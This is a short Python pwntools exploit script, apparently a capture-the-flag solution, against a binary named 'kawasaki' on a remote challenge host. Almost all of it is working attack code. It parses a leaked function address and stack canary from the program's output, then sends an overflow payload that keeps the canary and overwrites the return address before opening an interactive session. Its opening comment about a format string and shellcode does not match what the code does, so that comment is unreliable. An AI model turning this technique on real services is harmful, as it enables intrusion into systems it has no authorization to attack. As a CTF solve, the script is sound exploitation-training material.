import re
from pwn import *

# use format string to execute the shellcode for the spooky

context.arch = 'amd64'

if args.REMOTE:
    p = remote('lmao.lol', 6002)
elif args.HOST:
    p = process('./kawasaki')
else:
    context.terminal =['tmux', 'splitw', '-h', '-p', '75']
    p = gdb.debug('./kawasaki',
                  gdbscript='''
                  b *vuln+233
                  c
                  ''')

p.recvuntil(b'function @').decode('utf-8').strip()
rdn_addr_str = p.recvline().strip(b'\n')
print('rdn_addr_str', rdn_addr_str)
rdn_addr = int(rdn_addr_str, 16)

p.recvuntil(b'canary').decode('utf-8').strip()
text = p.recvline().strip(b'\n')

# Use a bytes pattern in re search
hex_value = re.search(b'0x[0-9a-fA-F]+', text)

# Check if a match is found and convert to integer
if hex_value:
    hex_number = int(hex_value.group(), 16)
    print(hex_value.group(), text)
else:
    print("No hex value found")

p.sendline(b"A"* 47 + p64(hex_number) + b"A" * 9 + b"A" *8 + p64(rdn_addr))

p.interactive()
